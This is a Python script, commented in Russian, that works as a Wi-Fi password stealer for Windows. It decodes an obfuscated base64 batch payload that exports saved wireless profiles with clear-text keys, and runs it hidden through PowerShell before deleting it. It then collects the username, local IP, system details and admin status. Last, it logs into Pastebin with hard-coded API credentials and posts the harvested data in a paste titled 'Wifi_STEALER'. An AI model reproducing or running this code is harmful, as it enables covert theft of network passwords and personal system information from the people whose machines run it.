import subprocess as sub,requests as req
import os,time
import base64 as b64
import socket
import os
import platform
import subprocess
import winreg

bat_code='''
OjpAbW9kZSAxNSwxCjo6QHBvd2Vyc2hlbGwgLXdpbmRvdyBIaWRkZW4gLWNvbW1hbmQgIiIgICAmOjogVW5jb21tZW50IGlmIHlvdSB3YW50IHRvIHJ1biB0aGUgcHJvZ3JhbSBpbiBoaWRkZW4gbW9kZQpARWNobyBvZmYKOjogQ2hhbmdlIHRoZSBjdXJyZW50IGVuY29kaW5nIHRvIHByaW50IHNwZWNpYWwgY2hhcmFjdGVycwpwb3dlcnNoZWxsIC1jICJbQ29uc29sZV06Ok91dHB1dEVuY29kaW5nID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOCIKCjo6IERlZmF1bHQgdmFsdWVzLiBDaGFuZ2UgdGhlbSB0byB3aGF0ZXZlciB5b3Ugd2FudCEKc2V0IHNlbGZkZWxldGU9MApzZXQgdXBsb2FkPTAKc2V0ICJjcmVkc2ZpbGU9b3V0LnR4dCIKc2V0ICJ3ZWJob29rPSIKOjoKCjo6IEFyZ3VtZW50cwppZiAiJX4xIj09Ii0tdXBsb2FkIiBpZiAiJX4yIiBuZXEgIiIgKAoJc2V0ICJ3ZWJob29rPSV+MiIKCXNldCB1cGxvYWQ9MQopCgppZiAiJX4xIj09Ii0tb3V0cHV0IiBpZiAiJX4yIiBuZXEgIiIgKAoJc2V0ICJjcmVkc2ZpbGU9JX4yIgoJc2V0IHVwbG9hZD0wCikKCjo6IFByZXBhcmUgZW52aXJvbm1lbnQgZm9yIHhtbCBmaWxlcwpkZWwgJWNyZWRzZmlsZSUgMj5udWwKcm1kaXIgL3MgL3EgIiV0ZW1wJVxwcm9maWxlcyIgMj5udWwKbWtkaXIgIiV0ZW1wJVxwcm9maWxlcyIgMj5udWwKcHVzaGQgIiV0ZW1wJVxwcm9maWxlcyIKCjo6IFByZXBhcmUgdGhlIHN0cjJoZXgudmJzIGZpbGUKY2FsbCA6aW5pdApuZXRzaCB3bGFuIGV4cG9ydCBwcm9maWxlIGtleT1jbGVhciA+bnVsCgo6OiBDaGVjayBmb3IgWE1MIGZpbGVzLiBJZiBub25lIGFyZSBmb3VuZCwgdGhlbiB0aGVyZSBhcmUgbm8gc2F2ZWQgcHJvZmlsZXMKc2V0IC9hIGY9MApmb3IgL2YgJSVpIGluICgnZGlyIC9iJykgZG8gKHNldCAvYSBmKz0xKQo6OiAxIGZvciBzdHIyaGV4LnZicwppZiAlZiU9PTEgKAoJZWNobyBbLV0gTm8gV2ktRmkgcHJvZmlsZXMgaGF2ZSBiZWVuIGZvdW5kLj4+JWNyZWRzZmlsZSUKCWdvdG8gZW5kUmVwZWF0CikKCgo6UmVwZWF0Cgk6OiBHZXQgdGhlIG5hbWUgb2YgbGFzdCBlbnVtZXJhdGVkIHhtbCBmaWxlCglzZXQgImZpbGU9IgoJZm9yIC9mICJkZWxpbXM9OiIgJSVpIGluICgnZGlyIC9iICoueG1sIDJePm51bCcpIGRvIChzZXQgZmlsZT0lJWkpCglpZiAiJWZpbGUlIj09IiIgKGdvdG8gZW5kUmVwZWF0KQoJOjogQ29udmVydCBmaWxlIHZhbHVlIHRvIGhleCwgdGhlbiByZW5hbWUgdGhlIGZpbGUgd2l0aCB0aGF0IG5hbWUgKHRvIGF2b2lkIHNwZWNpYWwgY2hhcnMgY2F1c2luZyB0aGUgcHJvZ3JhbSB0byBjcmFzaCkKCXNldCAiX2ZpbGU9JWZpbGUlIgoJZm9yIC9mICUlYSBpbiAoJ2NzY3JpcHQgLy9ub2xvZ28gc3RyMmhleC52YnMgIiVmaWxlJSInKSBkbyAoc2V0ICJmaWxlPSUlYSIpCglyZW5hbWUgIiVfZmlsZSUiICVmaWxlJSAyPiYxID5udWwKCgk6OiBHZXQgbmFtZQoJc2V0ICJuYW1lPSIKCWZvciAvZiAic2tpcD0xIHRva2Vucz0qIiAlJWogaW4gKCdmaW5kc3RyIC9jOiI8bmFtZT4iICIlZmlsZSUiJykgZG8gKHNldCBuYW1lPSUlaikKCXNldCAibmFtZT0lbmFtZTo8bmFtZT49JSIKCXNldCAibmFtZT0lbmFtZTo8L25hbWU+PSUiCgk6OiBBdm9pZCBwcm9ncmFtIGNyYXNoIHdpdGggbmFtZXMgdGhhdCBjb250YWluICImIiBjaGFyYWN0ZXIKCXNldCAibmFtZT0lbmFtZTomPV4mJSIKCgk6OiBDb252ZXJ0IG5hbWUgdG8gaGV4CglzZXQgIm5hbWVfaGV4PSIKCWZvciAvZiAidG9rZW5zPSoiICUlaiBpbiAoJ2ZpbmRzdHIgL2M6IjxoZXg+IiAiJWZpbGUlIicpIGRvIChzZXQgbmFtZV9oZXg9JSVqKQoJc2V0ICJuYW1lX2hleD0lbmFtZV9oZXg6PGhleD49JSIKCXNldCAibmFtZV9oZXg9JW5hbWVfaGV4OjwvaGV4Pj0lIgoKCTo6IEdldCBwYXNzd29yZAoJc2V0ICJrZXk9IgoJZm9yIC9mICJ0b2tlbnM9KiIgJSVqIGluICgnZmluZHN0ciAvYzoiPGtleU1hdGVyaWFsPiIgIiVmaWxlJSInKSBkbyAoc2V0IGtleT0lJWopCglpZiAiJWtleSUiPT0iIiAoc2V0ICJrZXk9bm9uZSIpCglzZXQgImtleT0la2V5OjxrZXlNYXRlcmlhbD49JSIKCXNldCAia2V5PSVrZXk6PC9rZXlNYXRlcmlhbD49JSIKCTo6IEF2b2lkIHByb2dyYW0gY3Jhc2ggd2l0aCBwYXNzd29yZHMgdGhhdCBjb250YWluICImIiBjaGFyYWN0ZXIKCXNldCAia2V5PSVrZXk6Jj1eJiUiCgoJOjogQ29udmVydCBrZXkgdG8gaGV4Cglmb3IgL2YgJSVhIGluICgnY3NjcmlwdCAvL25vbG9nbyBzdHIyaGV4LnZicyAiJWtleSUiJykgZG8gKHNldCAia2V5X2hleD0lJWEiKQoJCglkZWwgIiVmaWxlJSIgMj5udWwKCgllY2hvLgoJZWNobyBbIV0gU1NJRDogJW5hbWUlCgllY2hvIFsrXSBQYXNzd29yZDogJWtleSUKCgk6OiBGaXggYSB3ZWlyZCBlY2hvIHByb2JsZW0KCXNldGxvY2FsIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24KCWVjaG8gW15eIV0gU1NJRDogIW5hbWUhPj4lY3JlZHNmaWxlJQoJZW5kbG9jYWwKCWVjaG8gWytdIFBhc3N3b3JkOiAla2V5JT4+ICVjcmVkc2ZpbGUlCgllY2hvIFshXSBIZXggcGFpcjogJW5hbWVfaGV4JTNhJWtleV9oZXglPj4gJWNyZWRzZmlsZSUKCTo6IEhleCBwYWlycyBhcmUgYWRkZWQgYXMgYSBwcmVjYXV0aW9uIGluIGNhc2UgdGhlIFNTSURzL1Bhc3N3b3JkcyBjb250YWluIHNwZWNpYWwgY2hhcnMgYW5kIHRvIHByZXNlcnZlIHRoZSBvcmlnaW5hbCB2YWx1ZXMKCWVjaG8uPj4gJWNyZWRzZmlsZSUKZ290byBSZXBlYXQKOmVuZFJlcGVhdAoKOjo6OiBDbGVhbnVwCnBvcGQKCjo6IFNlbmQgY3JlZHNmaWxlIHRvIHdlYmhvb2sKaWYgJXVwbG9hZCU9PTEgKAoJcG93ZXJzaGVsbCAtYyAiSW52b2tlLVJlc3RNZXRob2QgLVVyaSAnJXdlYmhvb2slJyAtTWV0aG9kIFBPU1QgLUJvZHkgKEdldC1Db250ZW50IC1SYXcgLVBhdGggJyV0ZW1wJVxwcm9maWxlc1wlY3JlZHNmaWxlJScpIC1Db250ZW50VHlwZSAndGV4dC9wbGFpbiciID5udWwKCWRlbCAlY3JlZHNmaWxlJSAyPm51bAopCgo6OiBUaGUgcHJvZ3JhbSB3aWxsIGRlbGV0ZSBpdHNlbGYgKCsgY2xlYW4gYWxsIHRyYWNrcyEpIGlmIGVuYWJsZWQKaWYgJXNlbGZkZWxldGUlPT0xICgKCXJtZGlyIC9zIC9xICIldGVtcCVccHJvZmlsZXMiIDI+bnVsICY6OiBWZXJ5IGltcG9ydGFudCEKCWRlbCAiJX5mMCIgMj5udWwKKQoKbW92ZSAiJXRlbXAlXHByb2ZpbGVzXCVjcmVkc2ZpbGUlIiAiJWNkJSIgMj4mMSA+bnVsCnJtZGlyIC9zIC9xICIldGVtcCVccHJvZmlsZXMiIDI+bnVsCmV4aXQgL2IKCgo6aW5pdAoJOjogUHJlcGFyZSBzdHIyaGV4LnZicyBzY3JpcHQgdG8gYmUgdXNlZCBmb3Igc3RyaW5nIGNvbnZlcnNpb24gdG8gaGV4Cgk6OiBOb3RlOiBJdCdzIGZhc3RlciB0byB1c2UgYSB2YnMgc2NyaXB0IHRvIGNvbnZlcnQgdG8gaGV4IHRoYW4gYSBwb3dlcnNoZWxsIGNvbW1hbmQgOykKCShlY2hvIGlucHV0U3RyaW5nID0gV1NjcmlwdC5Bcmd1bWVudHNeKDBeKQoJIGVjaG8gaGV4U3RyaW5nID0gIiIKCSBlY2hvIEZvciBpID0gMSBUbyBMZW5eKGlucHV0U3RyaW5nXikKCSBlY2hvICAgICBoZXhWYWx1ZSA9IEhleF4oQXNjXihNaWReKGlucHV0U3RyaW5nLCBpLCAxXileKV4pCgkgZWNobyAgICAgaGV4U3RyaW5nID0gaGV4U3RyaW5nIF4mIGhleFZhbHVlCgkgZWNobyBOZXh0CgkgZWNobyBXU2NyaXB0LkVjaG8gaGV4U3RyaW5nKT5zdHIyaGV4LnZicwpFeGl0IC9i
'''










def get_local_ip():
    """Возвращает IP-адрес компьютера в локальной сети."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Отправка тестового пакета для получения ответа
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = 'Не удалось получить IP-адрес'
    finally:
        s.close()
    return IP

def is_admin():
    """Проверяет, является ли текущий пользователь администратором."""
    try:
        # Проверка с помощью winreg
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_READ)
        return True
    except Exception:
        return False

def get_computer_info():
    """Возвращает информацию о компьютере."""
    info = {}
    info['Операционная система'] = platform.system() + " " + platform.release()
    info['Процессор'] = platform.processor()
    info['Архитектура'] = platform.architecture()[0]
    info['Имя компьютера'] = os.getenv('COMPUTERNAME')
    return info







f=open("dfhDjdsbs.bat","a+")

f.write(b64.b64decode(bat_code).decode("utf-8"))
f.close()
sub.Popen(["powershell","-WindowStyle","hidden","start","dfhDjdsbs.bat"])

time.sleep(3)

os.remove("dfhDjdsbs.bat")

with open("out.txt","r") as f:
	data_out=""
	data_out+=f"PC INFO:{get_computer_info()} \n"
	data_out+=f"USER:{os.getlogin()} \n"
	data_out+=f"LOCAL_IP:{get_local_ip()} \n"
	data_out+=f"{is_admin()} \n"
	data_out+=str(f.readlines())
	print(data_out)
	fa=open("xzxzx.txt","a+")
	fa.write(data_out)
	fa.close()
    
os.remove("out.txt")





































d={"api_dev_key":"YMioKfd8RVH5Zxur4kmMV0rz_6PS8TMe",
"api_user_name":"TEXTOLIT07",
"api_user_password":"pastebinhack"}
 
rq=req.post("https://pastebin.com/api/api_login.php",data=d)
 
data={"api_dev_key":d["api_dev_key"],
"api_user_key":rq.text,
"api_paste_name":"Wifi_STEALER",
"api_paste_code":data_out,
"api_option":"paste"}
 
rq=req.post("https://pastebin.com/api/api_post.php",data=data)


